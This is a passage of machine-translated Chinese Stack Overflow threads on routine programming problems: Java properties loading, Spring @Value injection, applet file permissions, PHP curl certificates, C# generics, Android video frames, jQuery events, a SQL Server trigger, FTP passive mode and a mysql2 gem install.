at java.security.AccessController.doPrivileged(Native Method)
at java.security.AccessControlContext$1.doIntersectionPrivilege(AccessControlContext.java:105)
at java.awt.EventQueue.dispatchEvent(EventQueue.java:617)
at java.awt.EventDispatchThread.pumpOneEventForFilters(EventDispatchThread.java:275)
at java.awt.EventDispatchThread.pumpEventsForFilter(EventDispatchThread.java:200)
at java.awt.EventDispatchThread.pumpEventsForHierarchy(EventDispatchThread.java:190)
at java.awt.EventDispatchThread.pumpEvents(EventDispatchThread.java:185)
at java.awt.EventDispatchThread.pumpEvents(EventDispatchThread.java:177)
at java.awt.EventDispatchThread.run(EventDispatchThread.java:138)
BUILD SUCCESSFUL (total time: 3 seconds) 
```

这是获取 NullPointerException 的类的一部分：

```
 private Properties dbProperties = null;
    private final String dbName;

    public RecordBookDAO(String recordBookName)  {
        this.dbName = recordBookName;
        setDBSystemDir();
        dbProperties = loadDBProperties();
        String driverName = dbProperties.getProperty("derby.driver"); 
        loadDatabaseDriver(driverName);
        createDatabase();
    }

    private Properties loadDBProperties() {
        InputStream dbPropInputStream = null;
        dbPropInputStream = RecordBookDAO.class.getResourceAsStream("Configuration.properties");
        dbProperties = new Properties();
        try
        {
            dbProperties.load(dbPropInputStream);
        }
        catch (IOException ex)
        {
            ex.printStackTrace();
        }
        return dbProperties;
    } 
```

该课程的完整代码位于：[http](http://dl.dropbox.com/u/34926392/RecordBookDAO.java) ://dl.dropbox.com/u/34926392/RecordBookDAO.java 非常感谢您的帮助！先感谢您。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T08:22:10.767

你得到 NULL 在

```
dbPropInputStream = RecordBookDAO.class.getResourceAsStream("Configuration.properties"); 
```

检查 configuration.properties 是否存在。

如果您的属性文件与您用来调用“getResourceAsStream("")”的类位于同一目录中，那么您只需要文件的名称，而不需要它的绝对路径。

# java - 为什么Spring @Value 与@Controller 不兼容？

> ID：10102216
> 
> 赞同：4
> 
> 时间：2012-04-11T08:11:36.897
> 
> 标签：java, spring, annotations, aspectj, load-time-weaving

我正在寻找对这个问题的更好理解。一种解决方法非常简单，即将配置数据移动到另一个没有代理/建议的类，但我认为更好地理解这一点将有助于我将来避免其他相关问题，所以我想要任何解释可以提供。

我将 Spring 3.1.0.RELEASE 与 Spring STS 和 vFabric tc 服务器一起使用。使用 @Controller 类实现了一个基本的小型 REST 服务器。这一切都很好（确实如此），但@Controller 也是@Transactional，在它与加载时间编织和 vFabric tc 服务器之间，它破坏了@Value。

```
@Controller
@RequestMapping("/hello")
public class MyAPI {

    @Value("${my.property}")
    private String prop;
    ...

    @Transactional
    handleRequest(...) ...

} 
```

还有一个属性文件 app.properties：

```
my.property = SUCCESS 
```

这在 JUnit 下运行良好，测试获得了一个将 prop 设置为“SUCCESS”的 MyAPI 对象。但是当应用程序被加载到 vFabric 中时，我猜它会获得加载时间编织和代理。无论发生什么，都会创建两个 MyAPI 实例，一个具有 prop == "SUCCESS"，另一个（不幸的是，它是处理 http 请求的那个）具有 prop == "${my.prop}"。

所以总而言之，我称之为魔法失败，这是我使用 AOP 之类的东西时最关心的问题。即使使用 STS，我也不知道如何找出问题背后的原因或弄清楚这是否是一个严重的错误。如果是 bug，我不知道是 Spring、AspectJ、load-time weaver 还是 vFabric 中的 bug，所以我什至不知道在哪里提交 bug 报告。

因此，对于理解这一点的任何帮助将不胜感激。谢谢。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-12T02:50:50.037

我想到了。确实，这太魔幻了。

我在 STS 中使用 Spring Roo 来生成基本的应用程序框架，然后使用 STS 分解 Roo，因为我们不想坚持使用它。

Roo 作为“最佳实践”所做的一件事是创建两个 Spring 上下文，一个用于整个应用程序，一个仅限于调度程序 servlet。究竟是为什么，我还没有明白，但我猜他们希望保持表示层的东西，比如控制器，不会蔓延到共享的服务层。axtavt[在这里](https://stackoverflow.com/a/4335438/712765 "@Service 被构造了两次")很好地解释了这一点。这一切都被 STS 隐瞒了。

在带有 Roo 的 STS 中，WEB-INF 源不是我期望的，在 /src/main/resources 下（这是 META-INF 目录所在的位置），而是在 /src/main/webapp 下，它不是 Java源目录，因此完全单独显示，就在 /target 目录上方，所以我误认为它是一个输出文件夹。

在 applicationContext.xml 中，Roo 插入了过滤器以防止应用程序上下文构造控制器，如 axtavt 的帖子中所述，但它还放入了另一个过滤器以消除扫描 Roo 生成的类。我同时取出了两个过滤器，我并不知道它们是用来做什么的，但我认为它们只是 Roo 的剩菜。

所以现在我遇到了[控制器被创建两次](https://stackoverflow.com/a/4335438/712765 "@Service 被构造了两次")的问题，如前所述。应用程序上下文中的那个获取分配的属性，因为它正在使用 applicationContext.xml 并查找属性文件。但是为什么他们都没有设置属性呢？

这让我回到了模糊的 webapps 文件夹。在 WEB-INF 文件夹中，Roo （自然地）放置了 web.xml 和一个包含 webmvc-config.xml 文件的 spring 文件夹。此配置文件设置为仅扫描、创建和设置控制器。web.xml 文件设置 web 应用程序使用 applicationContext.xml 和 dispatcherServlet 使用 webmvc-config.xml，所以我应该在 applicationContext.xml 中保留过滤器以避免重复创建。

最后一块拼图是这个 webmvc-config.xml 文件。由于这是设置控制器的上下文，因此**该**文件还需要配置 <context:property-placeholder/> 以便它可以找到属性文件。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-11T13:42:40.527

首先，使用 $ 的符号是正确的，而不是 #

现在关于原始海报，我认为您在 2 个注释（@Controller 和 @Transactional）之间存在冲突行为。

使用 @Transactional 注释将代理您的实现（我想检测错误并启动回滚）。

现在你说你看到了你的控制器的 2 个实例。那不应该发生。通常，您应该只在内存中加载一个控制器实例。

可能与您的配置文件有关，还是由于 @Transactional 的存在及其代理性质？

作为旁注，我从不在控制器本身中使用@Transactional，而是在服务或dao的方法上使用。由于可能失败并需要回滚的实际进程在那里，并且可以从不同的控制器/源访问。

问候。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-10-30T05:35:13.757

我有同样的问题，这是我需要两者的事实

让这两个 senarios 工作

1.  将属性（通过@Value）注入控制器
2.  将具有属性（通过@Value）的托管bean（通过@Inject）注入控制器

我希望这有帮助。

这是 web.xml。

```
 <servlet>
    <servlet-name>spring</servlet-name>
    <servlet-class>
        org.springframework.web.servlet.DispatcherServlet
    </servlet-class>
    <init-param>
        <param-name>contextConfigLocation</param-name>
        <param-value>classpath:/spring-config/spring-servlet.xml</param-value>
    </init-param>
    <load-on-startup>1</load-on-startup>
</servlet>

<servlet-mapping>
    <servlet-name>spring</servlet-name>
    <url-pattern>/</url-pattern>
</servlet-mapping> 
```

这是 spring-servlet.xml：关键是同时拥有 util:properties 和 context:property-placeholder。尽管它们定位相同的文件，但它们的用途不同。

```
<util:properties id="propSource" location="classpath:/properties/prop1.properties" />
<context:property-placeholder location="classpath:/properties/prop1.properties" />

<context:component-scan base-package="com.concurrent.controller" />

<context:annotation-config/>
<mvc:annotation-driven/> 
```

这是我的控制器类的片段：

```
@Controller
@RequestMapping("/fooController")
public class MyController {

@Value("${message1}")
public String message1;

@Inject
public ConfigProperties configProperties; 
```

最后，这是我将属性注入的类：

```
@Service
public class ConfigProperties {

@Value("${message1}")
public String message1;
} 
```

这对我有用，也对你有用。祝你好运！

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-09-11T03:49:03.043

就我而言，我是这样解决的：在我放这个`spring-servlet.xml`之前：`<context:component-scan ... />`

```
<context:property-placeholder location="classpath:strings.properties"/> 
```

虽然`strings.properties`我把文件放到`src/main/resources/`.

注意：`context:property-placeholder`标签的可见性有限，因此我在某处阅读了建议，以在每个上下文文件中复制它，您可以在其中使用字符串。

# java - 小程序如何在本地文件系统上读/写文件？

> ID：10102217
> 
> 赞同：-1
> 
> 时间：2012-04-11T08:11:41.287
> 
> 标签：java, swing, applet, japplet

在 Java JApplet 中，文件读取和写入操作在 webbrowser 中不起作用。当我单击“确定”按钮时，它应该在我们的本地路径中写入一些文件。但它显示以下错误。如何解决此错误？

```
java.security.AccessControlException: access denied (
    "java.io.FilePermission" "D:/.../.html" "write") 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-11T08:21:15.020

默认情况下，每当小程序尝试访问本地资源时，它都会作为安全层的一部分被拒绝。如果您需要使用小程序访问，您有以下选项：

1.  使用任何签名机制对您的小程序进行签名，然后发布，
2.  （尽管这不是一种有用且推荐的方法。）更改执行小程序的计算机上的安全设置。

# php - 卷曲 ssl 证书

> ID：10102225
> 
> 赞同：2
> 
> 时间：2012-04-11T08:12:44.263
> 
> 标签：php, curl, centos

我一直在 curl 中关闭 CURLOPT_SSL_VERIFYPEER 但我真的想在我的 php/centos/curl 检查其证书的任何地方进行升级。我有 CENTOS 4.7 i686，PHP 5.2.16。

我从 stripe.com 得到了一个不错的捆绑包： [https ://pastebin.com/raw.php?i=NZE2CuVJ](https://pastebin.com/raw.php?i=NZE2CuVJ)

我如何将它“安装”到我什至不需要使用的地方

```
curl_setopt($curl, CURLOPT_CAINFO, 'ca-certificates.crt'); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T10:05:05.033

将包保存为“certificates.pem”，并将其放在您的网络服务器上。然后使用

```
curl_setopt($curl, CURLOPT_CAINFO, '/link/to/directory/certificates.pem'); 
```

加载证书列表。此外，请确保您连接到正确的域。www.domain.com 可能有一个有效的证书，但 domain.com 可能没有。

更多信息：[https ://serverfault.com/questions/325120/curl-ssl-issue-with-rapidssl-certificates](https://serverfault.com/questions/325120/curl-ssl-issue-with-rapidssl-certificates)

# jasper-reports - iReport - 如何更改文本字段中的字符间距？

> ID：10102226
> 
> 赞同：8
> 
> 时间：2012-04-11T08:12:44.930
> 
> 标签：jasper-reports, ireport

是否可以更改文本字段中的字符间距`iReport designer`？如果没有，是否有任何其他解决方案在文本格式中`Java`或其他内容中？谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2020-08-05T13:57:52.470

*多年后， Jasper 工作室*仍然没有对此的支持。所以我做了一个肮脏的解决方法。在字符之间插入制表符，例如

```
"the quick brown fox jumps over the lazy dog".replace("","\t") 
```

然后您可以使用文本字段的段落属性控制标签大小 -`Tab Stop Width`

制表位宽度 = 1px [![制表位宽度 = 1px](../Images/520b13880bd0db17d81e17229df56f48.png)](https://i.stack.imgur.com/860o7.png)

制表位宽度 = 10px [![制表位宽度 10px](../Images/9c2be2862fb009fff1f67687315abfc4.png)](https://i.stack.imgur.com/krttE.png)

请注意“真正的”标签处理。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-12T20:30:33.110

你可以使用这样的东西......

```
($F{TEXT}.split("")).join(" ") 
```

在文本字段或变量中。然后添加一种修剪前导空格的方法。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2020-01-28T05:52:55.903

您必须使用具有更多字符间距的不同字体文件。在 iReport 中没有明确的设置来执行此操作。

# c# - 类型参数约束是一个类

> ID：10102241
> 
> 赞同：3
> 
> 时间：2012-04-11T08:13:36.943
> 
> 标签：c#, generics, inheritance, interface, covariance

我注意到其他开发人员使用这种技术，但它总是让我感到困惑。我决定今天早上进行调查，并在 MSDN 上发现了以下内容（来自[http://msdn.microsoft.com/en-us/library/d5x73970(v=vs.100).aspx](http://msdn.microsoft.com/en-us/library/d5x73970(v=vs.100).aspx)）：

```
public class GenericList<T> where T : Employee
{
...
} 
```

为什么我们要使用这个方法而不是用 Employee 替换类中的所有 T 实例？对我来说，这似乎是可维护性的胜利。我可以将限制接口理解为包含来自不同继承层次结构的类的一种方法，但是继承已经以更明显的方式解决了上述问题，不是吗？

这可能被认为是一个错误，还是像这样“修复”代码是一个错误？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-11T08:19:27.947

因为它可能是从 Employee 派生的东西。

```
public class EvilEmployee : Employee {
    public Int32 Evilness { get; set; }
} 
```

现在可以做...

```
GenericList<EvilEmployee> list = GetEvilEmployees();
var mostEvilEmployee = list.OrderByDescending(e => e.Evilness).First(); 
```

这是可能的，因为我们在编译时知道 T = EvilEmployee 并且 EvilEmployee 具有 Evilness 属性。如果我们将列表强制为不可能的 Employee 列表（不使用 OfType）。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-04-11T08:17:17.820

> 为什么我们要使用这个方法而不是用 Employee 替换类中的所有 T 实例？

启用：

```
class Manager : Employee { ... }

var board = new GenericList<Manager> (); 
```

请注意，在这种情况下，您的名称“GenericList”会更像“EmployeeList”

> 我可以理解对接口的限制是一种包含来自不同继承层次结构的类的方法

类继承和接口有很多共同点。

> 但是继承已经以更明显的方式解决了上述问题，不是吗？

是的，但不一样。`board.Add(lowlyProgrammer);`在这里会失败，而继承会允许它。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-11T08:20:28.273

where 语句是故意添加的。想想有从 Employee 类派生的类的情况；如果不定义泛型类，则需要为每个派生类定义一个类。

例如，如果 EmployeeX 继承 Employee，并且您想定义一个仅接受 EmployeeX 实例的 List，则通过使用通用方法，您不需要定义新类。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-11T08:24:53.870

泛型允许您在无需强制转换的情况下实现类型安全。

如果你有

```
 public class Manager : Employee
  {
     public double CalculateManagerBonus();
  } 
```

你可以做

```
 GenericList<Manager> managers = ....

   managers[0].CalculateManagerBonus(); 
```

如果你有

```
 GenericList<Employee> managers = ....

   // this is a compiler error
   managers[0].CalculateManagerBonus();

  // this is neccessary if there where no generics.
  ((Manager)managers[0]).CalculateManagerBonus(); 
```

# android - 从 Android 视频中获取帧

> ID：10102242
> 
> 赞同：9
> 
> 时间：2012-04-11T08:13:40.390
> 
> 标签：android, video

我想从视频中获取帧数。我正在使用以下代码：

```
package com.vidualtest;

import java.io.File;
import java.io.FileDescriptor;

import android.app.Activity;
import android.graphics.Bitmap;
import android.media.MediaMetadataRetriever;
import android.os.Bundle;
import android.os.Environment;
import android.widget.ImageView;

public class VidualTestActivity extends Activity {
/** Called when the activity is first created. */
File file;
ImageView img;

@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.main);

    img = (ImageView) findViewById(R.id.img);

    File sdcard = Environment.getExternalStorageDirectory();
    file = new File(sdcard, "myvid.mp4");

    MediaMetadataRetriever retriever = new MediaMetadataRetriever();

    try {
        retriever.setDataSource(file.getAbsolutePath());

        img.setImageBitmap(retriever.getFrameAtTime(10000,MediaMetadataRetriever.OPTION_CLOSEST));

    } catch (IllegalArgumentException ex) {
        ex.printStackTrace();
    } catch (RuntimeException ex) {
        ex.printStackTrace();
    } finally {
        try {
            retriever.release();
        } catch (RuntimeException ex) {
        }
    }

} 
```

}

在 getFrameAtTime() 中，我以毫秒为单位传递了不同的静态时间，如 10000、20000 等，但我仍然在不同的时间内从视频中获取相同的帧。我的目标是获得具有不同时间间隔的不同帧。

请给我你可能的帮助。

谢谢

* * *

## 回答 #1

> 赞同：35
> 
> 时间：2013-04-24T21:42:35.413

时间偏移参数以微秒为单位，而不是毫秒。因此，将您的时间偏移量乘以 1000，它应该可以正常工作。

感谢 Google 没有在文档中指定这一点。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2014-06-19T11:59:17.147

如果您的视频是 10 秒。如果您想在 1 秒后拍摄一帧，则将其增加 1000000，这意味着 1 秒后。

我已将图像视图的 id 存储在数组中..

```
int[] ids_of_images = new int[]{R.id.img,R.id.img2,R.id.img3,R.id.img4,R.id.img5};
looper =1000000; 
```

接着

```
 for(int i=0 ;i <10; i++)
        {
            ImageView imageView = (ImageView)findViewById(ids_of_images[i]);

            imageView.setImageBitmap(retriever.getFrameAtTime(looper,MediaMetadataRetriever.OPTION_CLOSEST));

            looper +=1000000;
        } 
```

我已经测试过了。它正在运行。我已经制作了十个 ImageView 并读取了上面的框架

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-10-07T00:23:00.117

尝试微秒，它应该工作！

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-10-30T08:50:09.497

使用[jCodec 库](http://jcodec.org/)，我可以使用此代码有效地获取所有帧以获取所有视频的帧：

```
private class Decoder extends AsyncTask<File, Integer, Integer> {
    private static final String TAG = "DECODER";

    protected Integer doInBackground(File... params) {
        FileChannelWrapper ch = null;
        try {
            ch = NIOUtils.readableFileChannel(params[0]);
            FrameGrab frameGrab = new FrameGrab(ch);
            MediaInfo mi = frameGrab.getMediaInfo();
            Bitmap frame = Bitmap.createBitmap(mi.getDim().getWidth(), mi.getDim().getHeight(), Bitmap.Config.ARGB_8888);

            for (int i = 0; !flag; i++) {

                frameGrab.getFrame(frame);
                if (frame == null)
                    break;
                OutputStream os = null;
                try {
                    os = new BufferedOutputStream(new FileOutputStream(new File(params[0].getParentFile(), String.format("img%08d.jpg", i))));
                    frame.compress(CompressFormat.JPEG, 90, os);
                } finally {
                    if (os != null)
                        os.close();
                }
                publishProgress(i);

            }
        } catch (IOException e) {
            Log.e(TAG, "IO", e);
        } catch (JCodecException e) {
            Log.e(TAG, "JCodec", e);
        } finally {
            NIOUtils.closeQuietly(ch);
        }
        return 0;
    }

    @Override
    protected void onProgressUpdate(Integer... values) {
        progress.setText(String.valueOf(values[0]));
    }
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-07-05T20:06:38.417

我认为 getFrameAt() 返回最接近您指定的时间间隔的帧。因此，如果最接近这两个时间间隔的帧相同，则指定 1000 或 1500 作为时间（以毫秒为单位）可能会返回相同的帧。要获得帧数，您可能希望获得重复的帧，然后通过检查几个像素来检查它们是否不同。但是你必须确保你不会错过任何帧。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2021-01-04T15:02:50.517

```
public Bitmap getFrameAtTime (long timeUs, int option) 
```

有人错过了`timeUs`预期为微秒的文档，而不是此方法的毫秒。[您可以在其他方法文档](https://developer.android.com/reference/android/media/MediaMetadataRetriever#getScaledFrameAtTime(long,%20int,%20int,%20int,%20android.media.MediaMetadataRetriever.BitmapParams))中找到该提示：

> **timeUs** long：以微秒为单位的时间位置

确保将您的毫秒乘以 1000

```
retriever.getFrameAtTime(1000000, Int) // returns the frame after one second 
```

# visual-studio - 我可以在 Visual Studio 中延长自动完成时间吗？

> ID：10102245
> 
> 赞同：0
> 
> 时间：2012-04-11T08:13:56.600
> 
> 标签：visual-studio, intellisense, visual-studio-2012

当我在 VS 11 beta 中按`.`或`->`在 C++ 中时，它会显示一个包含 9 个元素的自动完成。我可以告诉 VS 向我展示更多，也许是 20 个元素吗？我尝试搜索工具-> 选项但没有运气。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-13T08:49:35.933

这是 Visual Studio 的限制（自 2010 年起），无法更改。这里有类似的问题：[有没有办法改变 Visual Studio 2010 中智能感知弹出窗口的高度？](https://stackoverflow.com/q/2362272/63179)

# php - 将会话值添加到 js 表单文件？

> ID：10102249
> 
> 赞同：1
> 
> 时间：2012-04-11T08:14:23.950
> 
> 标签：php, javascript, html, session

想知道是否有人可以帮助我解决一个小问题。当我的用户像这样登录到我的 php 站点时，我存储了会话值`<?php echo $_SESSION['SecurityID_ContactName']; ?>`。

我可以在整个站点中重复使用这些值来显示登录的用户名，但是我现在需要将此值存储在创建表单的外部 js 文件中。这会将登录的用户名放在提交回mysql的表单字段中吗？

js 文件中的表单具有如下字段：

```
 form += '<label>Name</label>';
        form += '<input type="text" id="author" placeholder="Your name" />'; 
```

我编辑这个来举行会议：

```
 form += '<label>Name</label>';
        form += '<input type="text" id="author" value="<?php echo $_SESSION['SecurityAssist_ContactFullName']; ?>  />'"; 
```

这不起作用，没有真正的错误，因为它只是从 php 页面中删除了整个 js 脚本？我可以将会话值存储在 js 文件中吗？

亲切的问候

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T08:24:34.140

您仍然可以将其存储在 HTML 中，例如标签的`data-`属性中。`body`

```
<body data-username="<?php echo $_SESSION['SecurityAssist_ContactFullName']; ?>"> 
```

您可以使用 Javascript 查询它，`getAttribute()`例如：

```
var userName = document.body.getAttribute('data-username');
...
form += '<input type="text" id="author" value="' + userName + '"; 
```

[这是一个小演示](http://jsfiddle.net/bazmegakapa/D3ggu/1/)

对于跨浏览器支持，您还可以使用[jQuery](http://jquery.com/)（`attr()`或`data()`）或检查[这个问题](https://stackoverflow.com/questions/3755227/cross-browser-javascript-getattribute-method)。

* * *

另一个（IMO 不太干净）解决方案是将您的 Javascript 文件重命名为`.php`. 在这种情况下，网络服务器将运行它，因此您可以在其中使用 PHP 命令。在这种情况下，您应该发送适当的标头 ( `Content-type: text/javascript`)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T08:37:19.137

您只是引用错误的顺序；将其更改为：

```
form += '<input type="text" id="author" value="<?php echo $_SESSION['SecurityAssist_ContactFullName']; ?>" />'; 
```

# javascript - 设置选择的选项

> ID：10102252
> 
> 赞同：0
> 
> 时间：2012-04-11T08:14:44.290
> 
> 标签：javascript, jquery

我有选项选择。如何设置为 var selected 自动选择？

```
<option>
<select>1</select>
<select>2</select>
</option> 
```

例如，我手动选择选项 1，它自动是

> `<select selected="selected">1</select>`

**编辑**我发现。

```
<select id="sel">
    <option value="1">aa</option>
    <option value="2">bb</option>
    <option value="3">cc</option>
</select>

$("#sel").change(function(){
   alert($(this).val())
}); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T08:18:02.590

尝试这个

```
$("#myOption").val("1"); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-11T08:19:36.430

你的代码应该是

```
<select>
    <option selected="selected">1</option>
    <option>2</option>
</select> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-11T08:23:32.363

我同意@creminsn ！为了获得价值试试这个

```
var val;
$('#selectID').click(function(){
val=$('#selectID option:selected').val();
}); 
```

val 会给你选择的 val。如果你需要文本，你可以做

```
$('#selectID option:selected').text(); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-11T08:48:22.513

我不太明白您的问题是什么，但是我从您所写的内容中了解到您想要在用户从下拉列表中选择一个选项时提交表单？

在这种情况下，您需要JQuery[在](http://jquery.com)`.live()`下拉菜单上实现一个侦听器（`.post()`

在 jQuery 网站上查找这些内容。

# java - 检查现有表以插入一列，该值是否存在？

> ID：10102253
> 
> 赞同：0
> 
> 时间：2012-04-11T08:14:46.870
> 
> 标签：java, sql-server

我必须在名为“First”的表中插入值，但在插入值之前，我必须检查该行是否存在与以下注册“名称”。如果那里存在行值，那么我必须删除该行并将该行中存在的值插入到名为“second”的不同表中。然后，我必须将我的现值插入“第一”表。

我正在使用 SQL Server 2005

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T08:48:08.487

在我看来，当您尝试创建历史记录表时。它通常在触发器中完成，因为它涵盖了所有可能的场景。

这是一个存储过程，您可能会从 java 调用以插入或更新 First：

```
create proc ReplaceName (@Name varchar(100), @Value1 varchar(100), @Value2 varchar(100))
as
   set nocount on
-- try to update Name with new values
   update [First]
      set Value1 = @Value1,
          Value2 = @Value2
    where Name = @Name
-- If it does not exist
   if @@rowcount = 0
   begin
-- Insert new row
      insert into [First] (Name, Value1, Value2)
           values (@Name, @Value1, @Value2)
   end 
```

这是一个将旧副本保存到第二个的触发器：

```
create trigger HistoryFirst on [First]
after insert, update
as
   set nocount on

   insert into [Second] (Name, Value1, Value2)
        select Name, Value1, Value2
          from Deleted 
```

# javascript - tr 上的 dblclick 事件不起作用

> ID：10102257
> 
> 赞同：0
> 
> 时间：2012-04-11T08:14:55.137
> 
> 标签：javascript, jquery, html

我有一个只有两行表格的 html 页面，我想通过 jQuery 添加一个 dobleclick 事件。我的问题是这段代码没有运行，但是如果我使用 chrome 的 javascript 控制台并手动输入代码，代码就会运行。

```
$(document).ready(function () {
$('tr').dblclick(function(){
alert('Row dblclicked');
});
} 
```

有什么问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T08:20:27.693

问题是因为你没有结束你的括号`$(document).ready()`

您`);`在脚本的末尾丢失了。

尝试将您的代码更改为：

```
$(document).ready(function() {
$('tr').dblclick(function(){
alert('Row dblclicked');
});
}); 
```

[http://jsfiddle.net/Curt/SQzt6/4/](http://jsfiddle.net/Curt/SQzt6/4/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T08:21:09.490

在这里提琴：

[http://jsfiddle.net/LUNuq/](http://jsfiddle.net/LUNuq/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-11T08:21:54.650

你只是有一个语法问题：

```
$(document).ready(function () {
  $('tr').dblclick(function(){
    alert('Row dblclicked');
  });
}​);​ 
```

它有效：http: [//jsfiddle.net/bouillard/xGgFx/](http://jsfiddle.net/bouillard/xGgFx/)

# windows - Windows 资源管理器在 PASV 命令后挂断 FTP 连接

> ID：10102263
> 
> 赞同：0
> 
> 时间：2012-04-11T08:15:28.597
> 
> 标签：windows, ftp, explorer

我尝试实现一个简单的 FTP 服务器。它适用于总指挥官和 firefoxm，但 windows 资源管理器的工作方式非常奇怪。它发送“PASV”命令，得到 IP 和端口号的答案，然后抛出一个错误（“无法连接服务器”或类似的东西，没有描述）。我不明白为什么会这样。

或者也许我可以强制资源管理器以某种方式使用活动模式？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-18T09:24:29.800

解决了这个问题。我的服务器只有在收到命令后才打开被动端口，而资源管理器在 PASV 之后等待它准备好。

# mysql - 安装mysql2时出错

> ID：10102266
> 
> 赞同：7
> 
> 时间：2012-04-11T08:15:59.067
> 
> 标签：mysql, ruby-on-rails, ruby

我正在尝试在服务器上安装 mysql2。所以我的第一个不幸的线索如下

```
gem install mysql2 
```

输出

```
 Building native extensions.  This could take a while...
ERROR:  Error installing mysql2:
    ERROR: Failed to build gem native extension.

/usr/bin/ruby1.8 extconf.rb
checking for rb_thread_blocking_region()... no
checking for rb_wait_for_single_fd()... no
checking for mysql_query() in -lmysqlclient... no
checking for main() in -lm... yes
checking for mysql_query() in -lmysqlclient... no
checking for main() in -lz... yes
checking for mysql_query() in -lmysqlclient... no
checking for main() in -lsocket... no
checking for mysql_query() in -lmysqlclient... no
checking for main() in -lnsl... yes
checking for mysql_query() in -lmysqlclient... no
checking for main() in -lmygcc... no
checking for mysql_query() in -lmysqlclient... no
*** extconf.rb failed ***
Could not create Makefile due to some reason, probably lack of
necessary libraries and/or headers.  Check the mkmf.log file for more
details.  You may need configuration options.

Provided configuration options:
    --with-opt-dir
    --without-opt-dir
    --with-opt-include
    --without-opt-include=${opt-dir}/include
    --with-opt-lib
    --without-opt-lib=${opt-dir}/lib
    --with-make-prog
    --without-make-prog
    --srcdir=.
    --curdir
    --ruby=/usr/bin/ruby1.8
    --with-mysql-config
    --without-mysql-config
    --with-mysql-dir
    --without-mysql-dir
    --with-mysql-include
    --without-mysql-include=${mysql-dir}/include
    --with-mysql-lib
    --without-mysql-lib=${mysql-dir}/lib
    --with-mysqlclientlib
    --without-mysqlclientlib
    --with-mlib
    --without-mlib
    --with-mysqlclientlib
    --without-mysqlclientlib
    --with-zlib
    --without-zlib
    --with-mysqlclientlib
    --without-mysqlclientlib
    --with-socketlib
    --without-socketlib
    --with-mysqlclientlib
    --without-mysqlclientlib
    --with-nsllib
    --without-nsllib
    --with-mysqlclientlib
    --without-mysqlclientlib
    --with-mygcclib
    --without-mygcclib
    --with-mysqlclientlib
    --without-mysqlclientlib

Gem files will remain installed in /home/aaalsubaie/.gems/gems/mysql2-0.3.11 for inspection.
Results logged to /home/aaalsubaie/.gems/gems/mysql2-0.3.11/ext/mysql2/gem_make.out 
```

这不是故事的结局

跑完之后

```
[ps89405]$ mysql --help | grep Default -A 1
Default options are read from the following files in the given order:
/etc/my.cnf /etc/mysql/my.cnf /usr/etc/my.cnf ~/.my.cnf 
```

我试过了

```
 gem install mysql2 -- --with-mysql-config=~/.my.cnf --ruby=/usr/bin/ruby1.8 
```

和

```
gem install mysql2 -- --with-mysql-config=/usr/etc/my.cnf --ruby=/usr/bin/ruby1.8 
```

和

```
gem install mysql2 -- --with-mysql-config=/etc/my.cnf --ruby=/usr/bin/ruby1.8 
```

没有运气同样的错误。

我不运行 rvm

我的宝石环境是

```
 RubyGems Environment:
  - RUBYGEMS VERSION: 1.3.7
  - RUBY VERSION: 1.8.7 (2010-08-16 patchlevel 302) [x86_64-linux]
  - INSTALLATION DIRECTORY: /home/aaalsubaie/.gems/
  - RUBY EXECUTABLE: /usr/bin/ruby1.8
  - EXECUTABLE DIRECTORY: /home/aaalsubaie/.gems/bin
  - RUBYGEMS PLATFORMS:
    - ruby
    - x86_64-linux
  - GEM PATHS:
     - /home/aaalsubaie/.gems/
     - /usr/lib/ruby/gems/1.8
  - GEM CONFIGURATION:
     - :update_sources => true
     - :verbose => true
     - :benchmark => false
     - :backtrace => false
     - :bulk_threshold => 1000
  - REMOTE SOURCES:
     - http://rubygems.org/ 
```

这是我连续第二天尝试部署我的第一个 Rails 应用程序但没有运气，但它会容易得多。

更新：

现在命令正在运行并安装 mysql2 gem 感谢 Yanhao

```
gem install mysql2 -- --with-mysql-config=/usr/bin/mysql_config 
```

我现在在运行时遇到了 mysql2 gem 的新问题

```
bundle exec rails console 
```

我有

```
/home/aaalsubaie/ajhezaty.com/releases/20120411095320/vendor/bundle/ruby/1.8/gems/mysql2-0.3.11/lib/mysql2.rb:9:in `require': no such file to load -- mysql2/mysql2 (LoadError)
from /home/aaalsubaie/ajhezaty.com/releases/20120411095320/vendor/bundle/ruby/1.8/gems/mysql2-0.3.11/lib/mysql2.rb:9
from /usr/lib/ruby/gems/1.8/gems/bundler-1.0.7/lib/bundler/runtime.rb:64:in `require'
from /usr/lib/ruby/gems/1.8/gems/bundler-1.0.7/lib/bundler/runtime.rb:64:in `require'
